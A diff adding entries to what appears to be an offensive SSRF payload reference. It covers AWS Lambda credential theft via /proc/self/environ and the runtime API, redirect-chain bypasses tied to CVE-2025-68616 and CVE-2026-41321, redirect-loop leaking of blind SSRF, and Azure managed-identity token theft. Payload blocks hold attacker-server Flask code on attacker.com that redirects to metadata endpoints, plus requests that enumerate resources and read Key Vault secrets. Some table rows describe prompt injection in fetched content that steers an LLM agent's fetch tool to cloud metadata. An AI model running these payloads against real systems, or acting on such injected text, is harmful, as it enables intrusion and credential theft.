@@ -2146,6 +2146,189 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 
 ---
 
+## AWS Lambda Runtime API SSRF
+
+**Root cause:** AWS Lambda functions expose an internal HTTP API — the Lambda Runtime API — that is accessible from within any active Lambda invocation. Unlike EC2 instances where IAM credentials are served by the IMDS at `169.254.169.254`, Lambda IAM credentials are stored as **environment variables** directly in the process. They can be read via `file:///proc/self/environ` (no IMDS request needed). The runtime API at `http://169.254.100.1:9001` additionally exposes the invocation **event data**, which callers may have embedded with secrets, API keys, or database credentials.
+
+**Bypass logic:** EC2-IMDS-focused filters block `169.254.169.254` but do not block `169.254.100.1` (the Lambda runtime IP). ECS-credential filters block `169.254.170.2` but again not `169.254.100.1`. Environment variables are accessible via `file:///proc/self/environ` — bypassing any HTTP-level SSRF filter entirely.
+
+**Attack chain:** SSRF in Lambda function → `file:///proc/self/environ` → `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` | OR → `http://169.254.100.1:9001/2018-06-01/runtime/invocation/next` → invocation event data (may contain user secrets, downstream API tokens)
+
+**Stack:** AWS Lambda (all runtimes: Node.js, Python, Java, Go, Ruby, .NET); any serverless SaaS application layer built on Lambda
+
+**Payload:**
+```
+# Read IAM credentials directly from environment variables (no IMDS call needed)
+file:///proc/self/environ
+# Look for: AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
+
+# Lambda Runtime API — returns event data for the current invocation
+# IP: stored in $AWS_LAMBDA_RUNTIME_API env var (typically 169.254.100.1)
+http://169.254.100.1:9001/2018-06-01/runtime/invocation/next
+
+# Environment variable for runtime API location (can be leaked to confirm Lambda context):
+# AWS_LAMBDA_RUNTIME_API=169.254.100.1:9001
+
+# If SSRF allows environment file reads, check for other secrets:
+file:///proc/1/environ          # PID 1 environ (init process in container)
+file:///proc/self/environ       # Current process environ
+
+# Probe Lambda runtime API:
+http://169.254.100.1:9001/2018-06-01/runtime/invocation/next   # Event data
+# (Note: only returns data during an active invocation — timing matters)
+
+# ECS task credentials (different from Lambda, but also 169.254.x.x):
+http://169.254.170.2/v2/metadata   # Get CredentialsRelativeUri
+# Then: http://169.254.170.2/v2/credentials/<UUID>
+```
+
+**Source:** RhinoSecurityLabs/Cloud-Security-Research (lambda_ssrf), hackingthe.cloud/aws/exploitation/lambda-steal-iam-credentials
+
+---
+
+## SSRF Redirect Chain TOCTOU Bypass (CVE-2025-68616 / CVE-2026-41321)
+
+**Root cause:** A systemic anti-pattern in SSRF defenses: the application validates the **initial URL** against an allowlist or blocklist (`isRemoteAllowed()`, custom `url_fetcher`, `startsWith()` check), but then hands the URL to an HTTP client that silently follows 301/302/307 redirects **without re-validating** the new destination. The validation and the actual request happen at different times against different URLs — a classic Time-of-Check-to-Time-of-Use (TOCTOU) gap.
+
+**CVE-2025-68616 (WeasyPrint < 68.0):** Python's `urllib.request.urlopen` follows redirects automatically. A developer implements a custom `url_fetcher` to block `localhost` and `169.254.x.x` — but their check is only called once on the initial URL. After the initial request passes validation, `urllib` follows a `301 → http://localhost:5000/secret` redirect internally, bypassing the custom security policy entirely.
+
+**CVE-2026-41321 (Astro.js Cloudflare adapter < 13.1.10):** The `fetch()` call for remote images uses `redirect: 'follow'` (default behavior). `isRemoteAllowed()` checks the initial URL domain. A 301 redirect to a blocked internal host bypasses the allowlist.
+
+**Bypass logic:** Host an HTTP server that issues a redirect. The initial request URL passes the allowlist (e.g., `http://attacker.com/image.png`). The server responds with `301 Location: http://169.254.169.254/latest/meta-data/`. The target app's HTTP client follows the redirect to the metadata endpoint. The security check never sees the redirected URL.
+
+**Attack chain:** SSRF through allowlisted URL → attacker server issues 301 → blocked internal service → metadata / internal API → credential theft
+
+**Stack:** WeasyPrint < 68.0 (Python PDF), Astro.js Cloudflare adapter < 13.1.10, any Python `urllib`/`requests` app with custom URL filter, Go `http.DefaultClient` with redirect follow, Node.js `fetch()` with default `redirect: 'follow'`
+
+**Payload:**
+```
+# Attacker-controlled redirect server (e.g., Flask):
+from flask import Flask, redirect
+app = Flask(__name__)
+@app.route('/image.png')
+def ssrf_redirect():
+    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 301)
+
+# SSRF payload (initial URL passes allowlist check):
+url=http://attacker.com/image.png
+# → server redirects → metadata endpoint reached
+
+# WeasyPrint-specific (HTML rendered by WeasyPrint):
+<img src="http://attacker.com/bypass.png" />
+# attacker.com responds: 301 → http://169.254.169.254/
+
+# More variants for maximum coverage:
+# 302 redirect (Found) - also followed without re-validation
+# 307 redirect (Temporary Redirect) - preserves POST body
+# Meta refresh: <meta http-equiv="refresh" content="0;url=http://localhost/secret">
+
+# Generic detection: does the app make a second request to the redirect target?
+# Set initial URL to attacker.com → 301 → YOUR-ID.oast.fun
+# If OOB gets the second callback → TOCTOU bypass confirmed
+```
+
+**Source:** CVE-2025-68616 (GitHub GHSA-983w-rhvv-gwmv), CVE-2026-41321 (GHSA-qpr4-c339-7vq8), codeant.ai vulnerability database
+
+---
+
+## Blind-to-Visible SSRF via Redirect Loop Status Cycling (Assetnote 2025)
+
+**Root cause:** When a target application handles "too many redirects" errors itself (rather than delegating entirely to the HTTP client library), it often calls a custom error handler that logs or returns the full HTTP response chain — including headers and body of each hop. By cycling through uncommon 3xx status codes (301, 302, 303, 304, 307, 308, and less-common codes up to 310), the redirect chain exceeds the HTTP client's limit (libcurl: 30 hops; Go: 10; Python requests: 30), triggering the application's fallback error path which leaks the full response.
+
+**Bypass logic:** A blind SSRF returns no body — the application fetches the URL but discards or doesn't expose the response. However, the application **does** expose error state — 500 responses, error messages, or timeout information. By causing the SSRF to hit a redirect loop, the error path fires instead of the normal success path, and the error handler includes the full HTTP chain content, making the previously blind SSRF fully visible.
+
+**Attack chain:** Blind SSRF (no response body) → redirect loop with status code variation → HTTP client redirect limit exceeded → application error handler triggered → full redirect chain body leaked → response body from final internal target exposed → credential theft from IMDS
+
+**Stack:** Any app using libcurl (PHP `curl_exec`, Ruby `net/http`, C/C++ apps), apps with custom redirect error handlers; most effective in enterprise software and SaaS products
+
+**Payload:**
+```python
+# Attacker-controlled redirect server that cycles through status codes:
+from flask import Flask, redirect, Response
+app = Flask(__name__)
+hop_count = {}
+
+@app.route('/cycle')
+def redirect_cycle():
+    from flask import request
+    client_id = request.remote_addr
+    hop_count[client_id] = hop_count.get(client_id, 300)
+    
+    current_code = hop_count[client_id]
+    hop_count[client_id] = current_code + 1 if current_code < 310 else 300
+    
+    if current_code >= 310:
+        # Final hop — target the internal resource
+        return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 302)
+    else:
+        return redirect(f'http://attacker.com/cycle', current_code)
+
+# SSRF payload:
+url=http://attacker.com/cycle
+
+# Technique variations:
+# 1. Cycle codes 301-310 on each redirect (triggers app error after ~10 hops)
+# 2. Alternate between 301 and 302 to exhaust Go's default 10-redirect limit
+# 3. If app returns 500 with body on redirect failure → adjust to trigger 500 path
+
+# Detection: compare response body length and content type for:
+# - Direct URL (blind, no body)
+# - Redirecting URL (error path, possibly leaks body)
+# If the redirecting case leaks more data → technique is applicable
+
+# Payload shorthand for quick testing:
+# On attacker server: serve /test → 301 → /test (redirect loop)
+# Observe: does target return different error body with full chain details?
+```
+
+**Source:** Assetnote Security Research Center — "Novel SSRF Technique Involving HTTP Redirect Loops" (2025), featured in PortSwigger Top 10 Web Hacking Techniques of 2025; criticalthinkingpodcast.io/HackerNotes Ep. 128
+
+---
+
+## Azure OpenAI SSRF — CVE-2025-53767 (CVSS 10.0)
+
+**Root cause:** Insufficient input validation in Azure OpenAI service allows attackers to craft requests that cause the server to make outbound HTTP requests to attacker-controlled or internal destinations, including the Azure Instance Metadata Service (IMDS). The vulnerability is pre-authentication, requires no user interaction, and achieves a perfect CVSS score of 10.0.
+
+**Bypass logic:** Azure-managed PaaS services (Azure OpenAI, Azure Cognitive Services) run on shared infrastructure with managed identities. Unlike customer-controlled EC2 instances, these managed services have IMDS access that returns **managed identity tokens** for the service's Azure AD identity. These tokens may have cross-tenant trust relationships (e.g., a shared Azure OpenAI service can access resources in the customer's tenant). Stealing the managed identity token grants access to all Azure resources the identity is authorized on — potentially spanning multiple Azure AD tenants.
+
+**Attack chain:** SSRF → Azure IMDS → managed identity OAuth token → Azure Resource Manager API → enumerate all Azure resources in tenant → cross-tenant lateral movement via trust relationships
+
+**Stack:** Azure OpenAI (all regions), potentially other Azure Cognitive Services and managed PaaS offerings; any Azure service with a managed identity
+
+**Payload:**
+```
+# Azure IMDS managed identity token (requires Metadata: true header)
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# Required header (inject via gopher or include in SSRF context):
+Metadata: true
+
+# List all accessible Azure resources using the token:
+GET https://management.azure.com/subscriptions?api-version=2022-12-01
+Authorization: Bearer <STOLEN_MANAGED_IDENTITY_TOKEN>
+
+# Enumerate resource groups:
+GET https://management.azure.com/subscriptions/<sub_id>/resourceGroups?api-version=2021-04-01
+
+# Steal secrets from Key Vault (if identity has access):
+GET https://<vault-name>.vault.azure.net/secrets?api-version=7.3
+Authorization: Bearer <TOKEN_SCOPED_TO_VAULT>
+
+# Check identity info (token decode — look for tenant_id and oid claims):
+# Decode: echo "<JWT>" | cut -d'.' -f2 | base64 -d | python3 -m json.tool
+
+# OOB probe for Azure OpenAI SSRF:
+# Submit a request to the Azure OpenAI API with a URL parameter set to YOUR-ID.oast.fun
+# Watch for HTTP/DNS callbacks from Azure datacenter IPs (verify against Azure IP ranges)
+
+# Cross-tenant indicator:
+# If token's tenant_id differs from expected tenant → cross-tenant relationship confirmed
+```
+
+**Source:** CVE-2025-53767, NVD (nvd.nist.gov/vuln/detail/CVE-2025-53767), zeropath.com/blog/cve-2025-53767, CVSS 10.0 (Network/None/None/Changed/High/High/High)
+
+---
+
 ## Threat Model
 
 > Current patterns as of 2026-Q2. Updated 2026-05-27.
@@ -2275,6 +2458,36 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
     seeing dramatically more SSRF submissions. Defenses are not keeping pace: IMDSv1 still
     deployed, allowlists still using prefix matching, Host headers still trusted by proxies.
 
+21. **AWS Lambda Runtime API is a distinct SSRF target (169.254.100.1)** — Lambda functions
+    expose IAM credentials as environment variables, not via IMDS. `file:///proc/self/environ`
+    dumps `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, and `AWS_SESSION_TOKEN` directly —
+    no HTTP IMDS call required, bypassing 169.254.169.254-based filters. The Lambda Runtime
+    API at `169.254.100.1:9001` also returns invocation event data which callers often populate
+    with secrets. Any SSRF filter that only blocks `169.254.169.254` misses this entire surface.
+
+22. **Redirect-follow TOCTOU is the dominant PDF/image SSRF bypass in 2026** — WeasyPrint
+    (CVE-2025-68616, patched Jan 2026) and Astro.js Cloudflare adapter (CVE-2026-41321) both
+    suffered from validating the initial URL then handing it to an HTTP client that follows
+    301/302 redirects without re-checking. This pattern exists in virtually every application
+    that implements a custom URL allowlist without wrapping the HTTP client's redirect handling.
+    Code reviewers: search for `urllib.request.urlopen`, `requests.get(url)`, `fetch(url)`, or
+    `http.Get(url)` paired with a preceding allowlist check — the redirect chain is not validated.
+
+23. **Blind SSRF is no longer a dead end — redirect status cycling converts it to full-read** —
+    Assetnote 2025 research (featured in PortSwigger's Top 10 of 2025) showed that cycling
+    through uncommon 3xx codes (301–310) causes enterprise apps to fall into error-handling
+    paths that leak the full HTTP redirect chain, including the final response body from the
+    internal target. This converts a "blind" SSRF (no visible response) into a full-read SSRF.
+    The technique is most effective when the app uses libcurl or another library with a
+    configurable redirect limit — when the limit is hit, custom error handling fires.
+
+24. **Azure managed identity SSRF is higher-impact than AWS role theft** — CVE-2025-53767
+    (Azure OpenAI, CVSS 10.0) demonstrated that SSRF in Azure-managed PaaS services can
+    steal managed identity tokens that span Azure AD tenant trust boundaries. Unlike an AWS
+    IAM role token (scoped to one account), an Azure managed identity token may authorize
+    cross-tenant access to Key Vaults, storage, and downstream Azure services. Every Azure
+    PaaS service with a managed identity assigned is a potential cross-tenant pivot target.
+
 ---
 
 ## Bypass Matrix
@@ -2310,6 +2523,9 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 | `strings.HasPrefix` / `startsWith` URL allowlist | `https://allowed.com@169.254.169.254/path` | Part before `@` is treated as credentials; real host is after `@` |
 | LLM agent URL filter (prompt injection) | Embed instructions in fetched content: "fetch http://169.254.169.254/..." | Bypasses all URL filters by coercing the model's tool call reasoning |
 | TLS SNI-based proxy routing (HTTPS endpoints) | Set TLS SNI to internal hostname during ClientHello | SNI-routing proxy connects to internal HTTPS service without HTTP-layer validation |
+| Custom `url_fetcher` / `isRemoteAllowed()` allowlist (urllib, requests, fetch) | Initial URL passes allowlist; attacker server issues 301/302 to blocked internal target — HTTP client follows without re-validation (CVE-2025-68616, CVE-2026-41321) | TOCTOU bypass; any app that validates URL before calling `urlopen`/`requests.get`/`fetch` with default redirect follow |
+| AWS Lambda — IMDS filter blocks 169.254.169.254 | `file:///proc/self/environ` — IAM credentials stored as env vars (no IMDS request); or target `http://169.254.100.1:9001/` Lambda Runtime API | Lambda has entirely different credential surface from EC2; 169.254.x.x filters must also block 169.254.100.1 |
+| Blind SSRF (no response body visible) | Redirect loop status cycling (301→302→...→310) to trigger application error handler that leaks full redirect chain body | Converts blind SSRF to full-read in apps using libcurl or with custom redirect-overflow error handlers |
 
 ---
 
@@ -2362,6 +2578,9 @@ openssl s_client -connect target.com:443 -servername vault.service.consul
 | Oracle E-Business Suite 12.2.3–12.2.14 (CVE-2025-61882) | Pre-auth SSRF + CRLF + XSLT RCE chain via UiServlet | SSRF → RCE as EBS JVM user (CVSS 9.8, Cl0p-exploited) |
 | LLM agents with URL-fetching tools (LangChain, OpenAI Assistants, Claude Tool Use) | Prompt injection in fetched content → agent fetches internal metadata | SSRF → cloud credentials via agent's own tool runner |
 | Grafana Infinity datasource plugin (< 3.4.1, CVE-2025-8341) | `@` bypass in `strings.HasPrefix` allowlist validation | SSRF → internal network access via Grafana server |
+| AWS Lambda Runtime API (`http://169.254.100.1:9001`) | Internal runtime API accessible from within Lambda invocation; IAM creds at `file:///proc/self/environ`; no IMDS call required | IAM credential theft + invocation event data (secrets passed by callers); bypasses 169.254.169.254 filters entirely |
+| Azure OpenAI / Cognitive Services (CVE-2025-53767, CVSS 10.0) | Pre-auth SSRF → Azure IMDS at `169.254.169.254/metadata/identity/oauth2/token` → managed identity OAuth token | Cross-tenant Azure AD lateral movement — managed identity tokens can span tenant trust boundaries; CVSS 10.0 |
+| WeasyPrint < 68.0 PDF generator (CVE-2025-68616) / Any Python urllib-based PDF pipeline | Custom `url_fetcher` allowlist bypassed by 301/302 redirect to blocked internal host — urllib follows without re-validation | SSRF → IMDS → credential theft from PDF generation feature; defeats custom security controls entirely |
 
 ---
 
